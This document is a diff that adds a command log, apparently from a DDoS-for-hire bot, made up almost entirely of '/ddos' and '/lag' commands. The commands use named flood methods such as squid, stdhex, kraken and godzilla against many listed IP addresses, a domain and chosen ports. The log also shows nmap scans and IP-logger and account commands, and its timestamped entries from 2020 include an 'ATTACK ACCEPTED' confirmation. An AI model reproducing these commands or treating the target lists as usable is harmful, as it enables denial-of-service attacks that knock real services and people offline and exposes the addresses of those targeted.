@@ -1,0 +1,189 @@
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/plan
+/ddos udp 159.203.18.131 30
+/nmapsv 159.203.18.131
+/nmapresult
+/nmapresult
+/ddos udp 159.203.18.131 30 443
+/ddos stdhex 159.203.18.131 30 443
+/nmapresult
+/nmapresult
+/ddos tcp 159.203.18.131 30 1194
+/ddos stdhex 159.203.18.131 30 1701
+/tr4p
+/plan
+/tr4p
+/lag stdhex 148.251.7.114 125 120 10 53
+/ddos stdhex 148.251.7.114 120 53
+/lag stdhex 148.251.7.114 125 120 10 53
+/lagstop
+/lag stdhex 148.251.7.114 125 120 10 53
+/lagstop
+/ping 148.251.7.114
+/lag stdhex 148.251.7.114 125 120 10 53
+/ping 148.251.7.114
+/lag stdhex 148.251.7.114 125 120 10 53
+/nmapsv 159.203.18.131
+/lag stdhex 148.251.7.114 125 120 10 53
+/stoplag
+/lagstop
+/lag stdhex 148.251.7.114 125 120 10 53
+/nmapresult
+/lagstop
+/lag stdhex 138.68.5.42 125 120 10 53
+/lag stdhex 74.119.146.234 125 120 10 53
+/lagstop
+/lag stdhex 159.203.18.131 35 30 2 80
+/lag stdhex 174.238.146.214 125 120 10 30202
+/ping 174.238.146.214
+/lag stdhex 148.251.7.114 125 120 10 53
+/lagstop
+/ping 148.251.7.114
+/lag stdhex 148.251.7.114 125 120 5 53
+/plan
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/accounts
+/steamcode
+/accounts
+/vpn
+/ddos stdhex 157.230.214.240 120
+/lag stdhex 148.251.7.114 125 120 5 53
+/lagstop
+/lag stdhex 157.230.214.240 125 120 5 53
+/ddos stdhex 157.230.214.240 120
+/ddos stdhex 104.27.130.20 120 80
+/ddos stdhex 172.67.219.108 120 80
+/lag stdhex 172.67.219.108 125 120 5 80
+/lag stdhex 157.230.214.240 125 120 5 80
+/ddos stdhex 157.230.214.240 80
+/ddos squid 157.230.214.240 80
+/ddos squid 157.230.214.240 120
+/ddos squid 157.230.214.240 600
+/ddos squid 157.230.214.240 80
+/tr4p
+/ddos squid 157.230.214.240 120
+/lag squid 157.230.214.240 125 120 5 80
+/lag
+/methods
+/lag stdhex 157.230.214.240 125 120 5 80
+/lag squid 157.230.214.240 125 120 5 80
+/ddos squid 157.230.214.240 120
+/lag squid 157.230.214.240 125 120 5 80
+/lag squid 157.230.214.240 125 120 5 80
+/lag
+/methods
+/lag http 157.230.214.240 125 120 5 80
+/lag udp 157.230.214.240 125 120 5 80
+/lagstop
+/lag udp 157.230.214.240 125 120 5 80
+/ddos squid 157.230.214.240 120
+/ddos squid 157.230.214.240 120
+/ddos godzilla vse 157.230.214.240 120 80
+/ddos godzilla cudp 157.230.214.240 120 80
+/ddos kraken cudp 157.230.214.240 120 80
+/methods
+/ddos kraken squid 157.230.214.240 120 80
+/ddos kraken udp 157.230.214.240 120 80
+/ddos kraken udp 157.230.214.240 120 80
+/plan
+/ddos godzilla http 157.230.214.240 120 80
+/ddos kraken http 157.230.214.240 120 80
+/ddos kraken http 157.230.214.240 120 80 1500 GET
+/methods
+/ddos godzilla http 157.230.214.240 120 80 1500 GET
+/ddos kraken http 157.230.214.240 120 80 15000 GET
+/ddos kraken http 157.230.214.240 120 80 15000 POST
+/ddos kraken http 157.230.214.240 120 80 15000 HEAD
+/ddos godzilla http 157.230.214.240 120 80 15000 HEAD
+/ddos godzilla http 157.230.214.240 120 80 15000 POST
+/ddos godzilla http 157.230.214.240 120 80 15000 GET
+/ddos godzilla http mafiammo.com 120 80 15000 HEAD
+/ddos kraken http 157.230.214.240 120 domain=157.230.214.240 conns=5000
+/ddos godzilla http mafiammo.com 120 80 15000 GET
+/ddos godzilla http mafiammo.com 120 443 15000 GET
+/ddos godzilla http 157.230.214.240 120 80 15000 HEAD
+/methods
+/ddos godzilla udp 157.230.214.240 120 80
+/methods
+/ddos kraken squid 184.168.131.241 120 445
+/ddos kraken squid 184.168.131.241 120 80
+/ddos kraken std 184.168.131.241 120 445
+/ddos kraken squid 184.168.131.241 120 80
+/ddos kraken squid 184.168.131.241 120 21
+/ddos kraken udp 184.168.131.241 120 80
+/methods
+/ddos kraken http 157.230.214.240 120 domain=157.230.214.240 conns=1500000
+/ddos kraken squid 157.230.214.240 120 80
+/ddos kraken squid 162.214.117.123 120 80
+/lag kraken squid 157.230.214.240 125 120 80 100
+/lag squid 157.230.214.240 125 120 80 100
+/lagstop
+/lag squid 157.230.214.240 80 125 120 100
+/lagstop
+/lag squid 157.230.214.240 125 120 5 80
+/lagstop
+/ddos kraken squid 157.230.214.240 120 80
+/ddos kraken squid 157.230.214.240 120 80
+/ddos godzilla std 157.230.214.240 120 80
+/checkip 157.230.214.240
+/checkip 157.230.214.240
+/tr4p
+/plan
+/ddos kraken squid 159.69.249.26 120 8080
+/iplogger
+/tr4p
+/nmap 35.237.4.214
+/nmapresult
+/ping 35.237.4.214
+/ping 77.248.253.253
+/nmap 77.248.253.253
+/nmapresult
+/nmapresult
+/nmapresult
+/nmapresult
+/ddos kraken squid 77.248.253.253 80
+/ping 77.248.253.253
+/ping 77.248.253.253
+/ping 77.248.253.253
+/ping 77.248.253.253
+/ping
+/ping 49.44.83.42
+/ddos kraken squid 49.44.83.42 120 80
+/ping 49.44.83.42
+/ping 49.44.83.42
+/ping 49.44.83.42
+/ping 49.44.83.42
+/ping 77.248.253.253
+/nmap 156.57.244.133
+/nmapresult
+/nmap 35.227.62.178
+/nmapresult
+/ping
+/ping 65.175.235.155
+/iplogger
+[Thu Aug 06 2020 05:34:02 GMT-1100 (Samoa Standard Time)] /iplogger
+[Thu Aug 06 2020 05:56:44 GMT-1100 (Samoa Standard Time)] /methods
+[Thu Aug 06 2020 05:57:10 GMT-1100 (Samoa Standard Time)] /ddos squid 156.57.31.6 120 80
+[Thu Aug 06 2020 05:57:43 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 120 80
+[Thu Aug 06 2020 05:58:01 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 120 80
+[Thu Aug 06 2020 05:58:11 GMT-1100 (Samoa Standard Time)] /methods
+[Thu Aug 06 2020 05:58:23 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 120 443
+[Thu Aug 06 2020 05:58:47 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 156.57.31.6
+[Thu Aug 06 2020 05:58:55 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 156.57.31.6 120 80
+[Thu Aug 06 2020 05:59:41 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 156.57.31.6 120 80
+[Thu Aug 06 2020 17:40:45 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 120 80
+[Sun Aug 09 2020 03:17:31 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 120 80
+[Sun Aug 09 2020 03:18:05 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 120
+[Sun Aug 09 2020 03:24:51 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 10 2020 22:35:18 GMT-1100 (Samoa Standard Time)] /plan
+[Mon Aug 10 2020 22:35:35 GMT-1100 (Samoa Standard Time)] /ddos godzilla vse 156.57.31.6 120 80
+[Mon Aug 10 2020 22:36:41 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 129 89
+[Mon Aug 10 2020 22:36:58 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 156.57.31.6 129 80
+[Mon Aug 24 2020 19:59:04 GMT-1100 (Samoa Standard Time)] /tr4p
+[Mon Aug 24 2020 19:59:08 GMT-1100 (Samoa Standard Time)] /methods
+[Mon Aug 24 2020 20:01:02 GMT-1100 (Samoa Standard Time)] /checkip 52.58.78.16
+[Mon Aug 24 2020 20:01:49 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 52.58.78.16 120 80
+[Mon Aug 24 2020 20:01:49 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Mon Aug 24 2020 20:02:22 GMT-1100 (Samoa Standard Time)] /ping 52.58.78.16
